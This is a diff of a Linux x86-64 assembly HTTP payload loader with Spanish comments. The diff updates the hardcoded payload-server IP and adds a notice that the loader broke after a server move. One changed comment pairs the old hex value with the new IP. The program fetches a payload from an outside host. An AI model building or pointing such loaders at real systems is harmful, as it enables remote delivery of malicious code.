@@ -1,7 +1,18 @@
 ;========================================================================================================================================================
+; I M P O R T A N T E
+; 
+; Se realizó un cambio de servidor donde están alojados los payloads y NO está funcionando este programa.
+; 
+; Anteriormente cuando funciona estaba en un Server: Microsoft-IIS/10.0
+; 
+; Estoy trabajando para que funcione en cualquier servidor. El problema está en como busca el Content-Length en la cabecera HTTP recibida.
+;========================================================================================================================================================
+
+
+;========================================================================================================================================================
 ; Archivo      : http-payload-loader-full-dynamic-checksum.asm
 ; Creado       : 26/02/2025
-; Modificado   : 19/03/2025
+; Modificado   : 07/05/2025
 ; Autor        : Gastón M. González
 ; Plataforma   : Linux
 ; Arquitectura : x86-64
@@ -43,7 +54,7 @@
 ;   por -> db "Host: localhost", 0x0D, 0x0A
 ;
 ; • Ajustar la IP del servidor para que apunte a localhost:
-;          server_ip    equ 0xB6783AC8   ; IP [200.58.120.182] del servidor en little endian
+;          server_ip    equ 0xB6783AC8   ; IP [82.25.67.145] del servidor en little endian
 ;   por -> server_ip    equ 0x0100007F   ; IP [127.0.0.1] en little endian
 ;
 ; • Cambiar el puerto a 8000 (para servir el archivo con Netcat)
@@ -71,7 +82,7 @@ section .rodata
              db 0x0D, 0x0A, 0                    ; solicitud HTTP GET formateada como exige el protocolo HTTP
     http_get_len equ $ - http_get                ; longitud de la cadena almacenada en http_get
 
-    server_ip    equ 0xB6783AC8                  ; IP [200.58.120.182] del servidor en little endian
+    server_ip    equ 0x91431952                  ; IP [82.25.67.145] del servidor en little endian
     http_port    equ 0x5000                      ; puerto 80 en little endian
 
     content_length db "content-length:"          ; cadena a buscar para obtener tamaño del payload
